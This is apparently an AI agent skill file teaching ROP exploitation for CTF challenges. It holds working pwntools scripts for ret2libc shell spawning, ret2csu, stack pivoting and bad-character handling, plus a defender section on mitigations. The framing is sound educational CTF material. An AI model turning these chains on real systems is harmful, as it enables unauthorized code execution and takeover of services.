---
name: rop-chains
description: Use when you need to build a Return Oriented Programming chain
  on an authorized target, such as a CTF pwn challenge with NX enabled and no
  easy win function. Covers gadget hunting with ROPgadget 7.x and Ropper
  1.13.x, building chains with pwntools 4.13, ret2libc and ret2system
  patterns, the ret2csu technique for argument setup, stack pivoting when
  buffer space is short, and handling bad characters. Use when NX blocks
  shellcode, when you must call functions with controlled arguments, or when
  pwn-fundamentals got you control of RIP and now you need to do something
  useful with it.
version: 1.0.0
domain: binary
lifecycle: stable
last_verified: "2026-10-23"
requires: []
extends: []
relates: [pwn-fundamentals, shellcode-basics]
tools:
  - name: pwntools
    version: "4.13"
  - name: ROPgadget
    version: 7.4
  - name: Ropper
    version: 1.13.x
  - name: GDB
    version: 15.2
---

Return Oriented Programming builds an exploit out of the binary's own
code: short instruction sequences ending in `ret` (gadgets) are chained
together on the stack so each `ret` jumps to the next gadget, letting you
run arbitrary logic even when the stack is not executable. This skill
covers the authorized workflow for finding gadgets and assembling chains,
from simple ret2libc through ret2csu and stack pivots. It assumes you
already control the instruction pointer (see pwn-fundamentals for getting
there). All exploitation targets binaries you have written permission to
test, such as CTF challenges or lab systems.

## Quick Workflow

1. Confirm NX is enabled and list the binary's protections so you know
   ROP is required.
2. Hunt for gadgets in the binary with ROPgadget or Ropper; fall back to
   libc gadgets if the binary is small.
3. Build the chain with pwntools ROP: set up arguments with pop gadgets,
   call the target function.
4. Handle the 16-byte stack alignment requirement on 64-bit with a spare
   `ret` gadget.
5. If the overflow buffer is too small for the chain, pivot the stack to
   a larger controlled buffer.
6. Test the chain locally under GDB, single-stepping through the first
   gadgets to verify register state.
7. Adapt for remote: correct libc, correct base addresses, and retry
   logic.

## 1. Gadget hunting

A gadget is a few instructions ending in `ret`. The essential ones are
`pop rdi; ret` (first argument), `pop rsi; ret` (second argument), and a
plain `ret` (alignment).

```bash
# List all gadgets in the binary
ROPgadget --binary ./vuln | head -40

# Search for the specific gadgets you need
ROPgadget --binary ./vuln --only "pop|ret" | grep -E 'pop rdi|pop rsi|ret$'

# Ropper alternative with quality scoring
ropper --file ./vuln --search "pop rdi"
ropper --file ./vuln --search "ret"
```

Small binaries often lack `pop rsi; ret`. Options: use gadgets from
libc (huge gadget supply once you leak libc base), or use the ret2csu
technique below, which uses `__libc_csu_init` gadgets present in every
dynamically linked binary.

```bash
# Gadgets inside libc (after you know which libc the target uses)
ROPgadget --binary ./libc.so.6 --only "pop|ret" | grep 'pop rdi'
```

In pwntools, the ROP object automates gadget search:

```python
from pwn import *
exe = ELF('./vuln')
rop = ROP(exe)
print(rop.rdi)   # address of 'pop rdi; ret' or similar
print(rop.rsi)
print(rop.ret)
```

## 2. ret2libc: the standard chain

Goal: call `system("/bin/sh")` using libc, with ASLR defeated by a leak.
This extends the leak pattern from pwn-fundamentals.

```python
#!/usr/bin/env python3
from pwn import *

exe = ELF('./vuln')
libc = ELF('./libc.so.6')  # the REMOTE libc
OFFSET = 72

def leak_libc(p):
    rop = ROP(exe)
    payload = b'A' * OFFSET
    payload += p64(rop.find_gadget(['pop rdi', 'ret'])[0])
    payload += p64(exe.got['puts'])
    payload += p64(exe.plt['puts'])
    payload += p64(exe.symbols['main'])
    p.sendline(payload)
    p.recvline()
    return u64(p.recvline().strip().ljust(8, b'\x00'))

p = process('./vuln')
puts_addr = leak_libc(p)
libc.address = puts_addr - libc.symbols['puts']

rop = ROP([exe, libc])
rop.system(next(libc.search(b'/bin/sh')))
print(rop.dump())  # inspect the chain before sending

payload = b'A' * OFFSET + rop.chain()
p.sendline(payload)
p.interactive()
```

`rop.dump()` is your debugging friend: it prints each gadget address
and value in order. Read it before sending; a misplaced value is
obvious in the dump and invisible in a hex blob.

## 3. ret2csu: universal argument setup

`__libc_csu_init` contains two gadgets that together set rbx, rbp, r12,
r13, r14, r15 and then call a function pointer with rdi, rsi, rdx
controlled. This works on any dynamically linked binary, even tiny ones
with no `pop rsi` gadget.

```bash
# Find the csu gadgets
objdump -d ./vuln | grep -A20 '<__libc_csu_init>:'
# Look for:
#   pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
#   mov rdx,r15; mov rsi,r14; mov edi,r13d; call [r12+rbx*8]
```

```python
# ret2csu chain calling write(1, got_puts, 8) to leak an address
csu_pop = 0x4006aa   # pop rbx,rbp,r12,r13,r14,r15; ret
csu_call = 0x400690  # mov rdx,r15; mov rsi,r14; mov edi,r13d; call [r12+rbx*8]

payload = b'A' * OFFSET
payload += p64(csu_pop)
payload += p64(0)              # rbx = 0 (index into the call table)
payload += p64(1)              # rbp = 1 (loop runs once: rbx != rbp)
payload += p64(exe.got['write'])  # r12 -> address of function pointer
payload += p64(1)              # r13 -> rdi = fd 1 (stdout)
payload += p64(exe.got['puts'])   # r14 -> rsi = buffer to leak
payload += p64(8)              # r15 -> rdx = length
payload += p64(csu_call)
payload += b'A' * 56           # padding the call gadget consumes
payload += p64(exe.symbols['main'])
```

The 56 bytes of padding account for the six popped registers plus the
return slot the call gadget sequence consumes. Get this wrong and the
chain desynchronizes; verify in GDB by watching RSP at each step.

## 4. Stack pivoting

When the overflow buffer holds fewer bytes than your chain needs, move
the stack pointer to a bigger buffer you control (often the BSS).

```bash
# Find a stack pivot gadget: xchg rsp, rax / mov rsp, rbp / leave; ret
ROPgadget --binary ./vuln --only "xchg|mov|leave" | grep -E 'rsp' | head
```

The classic pivot: overflow a small buffer to overwrite RBP, then a
`leave; ret` (`mov rsp, rbp; pop rbp; ret`) moves the stack to a fake
frame you placed in BSS via an earlier read.

```python
# Two-stage pivot: first read the real chain into BSS, then pivot to it
bss = exe.bss() + 0x100

# Stage 1: read(0, bss, 0x400) then pivot
rop = ROP(exe)
rop.read(0, bss, 0x400)
# then a leave;ret with rbp pointing at the fake frame
payload = b'A' * OFFSET
payload += p64(rop.find_gadget(['pop rbp', 'ret'])[0])
payload += p64(bss - 8)       # rbp points just below the fake frame
payload += p64(exe.symbols['leave_ret'])  # or find 'leave; ret'
p.sendline(payload)

# Stage 2: send the real ROP chain, which now executes from BSS
rop2 = ROP([exe, libc])
rop2.system(next(libc.search(b'/bin/sh')))
p.sendline(rop2.chain())
p.interactive()
```

## 5. Bad characters

If input passes through `strcpy` or a filter, bytes like `0x00`, `0x0a`,
or `0x20` may terminate or corrupt the payload. Detect and route around
them.

```python
# Test which bytes survive: send all 256 and see what comes back
# (adapt to the binary's echo or leak behavior)
for i in range(256):
    p = process('./vuln')
    p.send(bytes([i]) * 8)
    # observe truncation or transformation
```

Workarounds:

- Pick gadgets whose addresses avoid bad bytes (search libc for
  alternative gadgets at clean addresses).
- Build forbidden values arithmetically: load a nearby clean value and
  adjust with `add` gadgets.
- For `/bin/sh` with a null-byte filter, write it to memory in two
  halves with `mov` gadgets instead of embedding the string.
- If `0x0a` (newline) terminates input via `fgets`, keep every payload
  byte free of newlines, or switch to a `read`-based input path.

## 6. Debugging chains in GDB

```bash
gdb -q ./vuln
# (gdb) break *main
# (gdb) run < payload.txt
# Step through the chain:
# (gdb) break *0x4006aa   # first gadget
# (gdb) continue
# (gdb) info registers rdi rsi rdx rsp
# (gdb) x/8gx $rsp         # inspect the upcoming chain on the stack
```

Checklist at each gadget: are the argument registers correct, does RSP
point at the next gadget address, and is the stack 16-byte aligned
before each `call`. Most mysterious crashes are alignment or a wrong
gadget address, both visible in this inspection.

pwntools GDB integration attaches automatically:

```python
p = process('./vuln')
gdb.attach(p, gdbscript='break *main\ncontinue')
```

## Edge cases

- No `pop rdi` in the binary and no libc leak yet: use ret2csu, which
  needs no pop gadgets at all.
- The binary is statically linked: gadget supply is enormous (the
  whole libc is inside), but addresses shift with every build. Leak
  or brute-force as needed.
- Gadget addresses contain bad bytes: search for equivalent gadgets
  at different addresses; libc usually has dozens of `pop rdi`
  variants.
- The chain works locally but not remotely: the number one cause is a
  wrong libc file. Verify with the leak: the leaked address minus the
  local libc symbol must equal the remote base you assume.
- seccomp filters block execve: ROP can still read the flag with
  `open`/`read`/`write` chains (an ORW chain). Check seccomp with
  `seccomp-tools dump ./vuln` if available.
- Stack alignment faults inside libc functions: prepend a `ret`
  gadget before every libc call on 64-bit.

## Escalation

- ROP is impossible because the binary has almost no gadgets (tiny
  static binary): consider Sigreturn Oriented Programming (SROP),
  which needs only one `syscall; ret` gadget and builds a fake signal
  frame to set all registers at once.
- You need more complex logic than a linear chain: chain into a
  `mprotect` call to make a memory region executable, then jump to
  shellcode there (see shellcode-basics). This is the standard
  ROP-to-shellcode escalation.
- The target has Control Flow Integrity or CET: classic ROP dies.
  These mitigations are rare in CTF but common in hardened
  production; document the mitigation as effective and look for
  logic bugs instead.
- Time is short: pwntools `ROP` with `rop.call()` and `rop.dump()`
  builds correct chains faster than hand-assembling gadgets. Trust
  the tooling and verify with the dump.

## Detection and defender view

Defenders detect ROP through control-flow integrity violations,
hardware CET faults, and behavioral monitoring (a network service
crashing repeatedly, then spawning a shell). The durable mitigations
are compiler-level: CET and shadow stacks, control-flow integrity
(CFI), and full RELRO with PIE so gadget addresses are unknowable.
Address space randomization raises the bar from one leak to a full
chain. For code review, the fix is the same as for any memory bug:
eliminate the initial overflow, because ROP is only the payload after
the vulnerability.

## Key references

- CWE-121 (Stack-based Buffer Overflow): the entry vulnerability.
- CWE-787 (Out-of-bounds Write).
- MITRE ATT&CK T1068 (Exploitation for Privilege Escalation).
- ROPgadget documentation: https://github.com/JonathanSalwan/ROPgadget
- Ropper documentation: https://github.com/sashs/Ropper
- pwntools ROP documentation: https://docs.pwntools.com/en/stable/rop/rop.html
